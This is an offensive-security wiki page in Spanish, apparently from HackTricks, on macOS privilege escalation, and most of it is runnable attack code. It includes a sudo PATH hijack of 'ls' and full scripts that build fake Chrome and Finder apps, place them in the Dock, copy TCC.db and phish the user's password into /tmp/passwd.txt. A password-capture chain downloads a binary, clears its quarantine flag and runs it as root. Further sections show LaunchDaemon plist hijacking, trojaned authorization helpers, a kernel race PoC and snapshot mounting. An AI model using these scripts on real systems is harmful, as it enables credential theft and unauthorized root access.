# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Si llegaste aquí buscando TCC privilege escalation, ve a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Ten en cuenta que **la mayoría de los trucos sobre privilege escalation que afectan a Linux/Unix también afectarán a máquinas MacOS**. Así que consulta:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interacción del usuario

### Sudo Hijacking

Puedes encontrar la versión original en [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Sin embargo, macOS **mantiene** el **`PATH`** del usuario cuando ejecuta **`sudo`**. Lo que significa que otra forma de lograr este ataque sería **hijack other binaries** que la víctima ejecutará cuando use **sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Ten en cuenta que un usuario que usa el terminal probablemente tendrá **Homebrew instalado**. Por eso es posible secuestrar binarios en **`/opt/homebrew/bin`**.

### Dock Impersonation

Usando algo de **social engineering** podrías **suplantar por ejemplo a Google Chrome** dentro del Dock y realmente ejecutar tu propio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algunas sugerencias:

- Revisa en el Dock si hay un Chrome y, en ese caso, **elimina** esa entrada y **añade** la **entrada falsa de Chrome en la misma posición** en el array del Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algunas sugerencias:

- No puedes **eliminar Finder del Dock**, así que si vas a añadirlo al Dock, podrías colocar el Finder falso justo al lado del real. Para esto necesitas **añadir la entrada del Finder falso al principio del Dock array**.
- Otra opción es no colocarlo en el Dock y simplemente abrirlo; "Finder asking to control Finder" no es tan raro.
- Otra opción para **escalate to root without asking** la contraseña con un cuadro horrible, es hacer que Finder realmente pida la contraseña para realizar una acción privilegiada:
- Pide a Finder que copie en **`/etc/pam.d`** un nuevo archivo **`sudo`** (El cuadro pidiendo la contraseña indicará que "Finder wants to copy sudo")
- Pide a Finder que copie un nuevo **Authorization Plugin** (Podrías controlar el nombre del archivo para que el cuadro que pide la contraseña indique que "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware frecuentemente abusa de la interacción del usuario para **capturar una contraseña que permite sudo** y reutilizarla programáticamente. Un flujo común:

1. Identificar al usuario conectado con `whoami`.
2. **Repetir solicitudes de contraseña** hasta que `dscl . -authonly "$user" "$pw"` devuelva éxito.
3. Almacenar la credencial en caché (p. ej., `/tmp/.pass`) y ejecutar acciones privilegiadas con `sudo -S` (contraseña por stdin).

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
La contraseña robada puede ser reutilizada para **limpiar la cuarentena de Gatekeeper con `xattr -c`**, copiar LaunchDaemons u otros archivos privilegiados, y ejecutar etapas adicionales de forma no interactiva.

## Vectores específicos de macOS más recientes (2023–2025)

### `AuthorizationExecuteWithPrivileges` deprecado aún usable

`AuthorizationExecuteWithPrivileges` fue deprecado en 10.7 pero **todavía funciona en Sonoma/Sequoia**. Muchos actualizadores comerciales invocan `/usr/libexec/security_authtrampoline` con una ruta no confiable. Si el binario objetivo es escribible por el usuario, puedes plantar un troyano y aprovechar el aviso legítimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combínalo con las **masquerading tricks above** para presentar un diálogo de contraseña creíble.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Si un LaunchDaemon plist o su objetivo `ProgramArguments` es **escribible por el usuario**, puedes escalar intercambiándolo y luego forzando a launchd a recargar:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Esto refleja el patrón de exploit publicado para **CVE-2025-24085**, donde se abusó de un plist escribible para ejecutar código del atacante como root.

### XNU SMR credential race (CVE-2025-24118)

Una **condición de carrera en `kauth_cred_proc_update`** permite a un atacante local corromper el puntero de credenciales de solo lectura (`proc_ro.p_ucred`) al competir con bucles `setgid()`/`getgid()` entre hilos hasta que ocurre un `memcpy` roto. La corrupción exitosa produce **uid 0** y acceso a memoria del kernel. Estructura mínima del PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Combínalo con heap grooming para colocar datos controlados donde el puntero vuelve a leer. En compilaciones vulnerables esto es una **local kernel privesc** fiable sin necesidad de SIP bypass.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Si ya tienes root, SIP todavía bloquea escrituras en ubicaciones del sistema. El bug **Migraine** abusa del entitlement de Migration Assistant `com.apple.rootless.install.heritable` para spawnear un proceso hijo que hereda SIP bypass y sobrescribe rutas protegidas (p. ej., `/System/Library/LaunchDaemons`). La cadena:

1. Obtener root en un sistema en ejecución.
2. Trigger `systemmigrationd` con un estado manipulado para ejecutar un binario controlado por el atacante.
3. Usar el entitlement heredado para parchear archivos protegidos por SIP, persistiendo incluso después del reinicio.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Múltiples daemons de Apple aceptan objetos **NSPredicate** sobre XPC y solo validan el campo `expressionType`, que está controlado por el atacante. Al craftear un predicate que evalúe selectors arbitrarios puedes lograr **code execution in root/system XPC services** (p. ej., `coreduetd`, `contextstored`). Cuando se combina con un app sandbox escape inicial, esto otorga **privilege escalation without user prompts**. Busca endpoints XPC que deserialicen predicates y carezcan de un visitor robusto.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Cualquier usuario** (incluso sin privilegios) puede crear y montar un snapshot de Time Machine y **acceder a TODOS los archivos** de ese snapshot.\
El **único privilegio** necesario es que la aplicación usada (como `Terminal`) tenga **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), lo cual debe ser concedido por un admin.

<details>
<summary>Montar snapshot de Time Machine</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Una explicación más detallada se puede [**encontrar en el informe original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Información sensible

Esto puede ser útil para escalar privilegios:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referencias

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
